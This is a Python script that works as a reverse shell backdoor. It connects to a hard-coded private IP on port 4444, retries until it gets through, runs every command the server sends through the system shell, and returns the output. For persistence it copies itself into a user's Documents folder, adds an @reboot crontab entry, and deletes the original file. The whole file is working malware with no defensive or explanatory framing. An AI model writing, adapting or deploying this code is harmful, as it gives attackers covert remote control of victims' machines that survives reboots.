#!/usr/bin/env python

import socket
import time
import subprocess
import os
import shutil
import sys

SERVER_HOST = "192.168.252.145"  
SERVER_PORT = 4444
dest_path = "/home/nghia/Documents"
current_script = os.path.abspath(sys.argv[0])



def copy_addStart_del(dest_path):
    current_script = os.path.abspath(sys.argv[0])
    if not os.path.isdir(dest_path):
        print("Destination path is not a valid directory.")
        return
    script_name = os.path.basename(current_script)
    dest_script_path = os.path.join(dest_path, script_name)
    shutil.copy(current_script, dest_script_path)
    os.chmod(dest_script_path, 0o755)
    
    # Add to crontab
    cron_command = f'@reboot {dest_script_path}\n'
    process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    output, error = process.communicate(input=cron_command)
    if process.returncode == 0:
        print("Crontab has been configured successfully.")
    else:
        print(f"An error occurred: {error}")
    
    
    # Remove
    os.remove(current_script)

def connect_to_server():
    print(f"Start connecting to server:")
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))
            return s
        except Exception as e:
            print(f"Connection failed")
            time.sleep(30)

def send_data(s, data):
    try:
        s.send(data.encode())
    except ConnectionResetError:
        print("Server closed")
        try:
            s.close()
        except:
            pass
    except BrokenPipeError:
        try:
            s.close()
        except:
            pass

def receive_data(s):
    try:
        return s.recv(4096).decode()
    except Exception as e:
        print(f"Receiving failed")
        return None
        
        
     
def execute_command(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if process.returncode == 0:
            if output:
                return output.decode()
            else:
                return "Command executed successfully but no output generated."
        else:
            return error.decode()
    except Exception as e:
        return str(e)


def main():
    server_socket = connect_to_server()
    print("Connected to the server.")

    while True:
        command = receive_data(server_socket)

        if command.strip().lower() == "exit":
            break
        result = execute_command(command)
        send_data(server_socket, result)

    server_socket.close()



if __name__ == "__main__":
    if os.getcwd() != dest_path:
        copy_addStart_del(dest_path)
        exit()
    else:
        main()
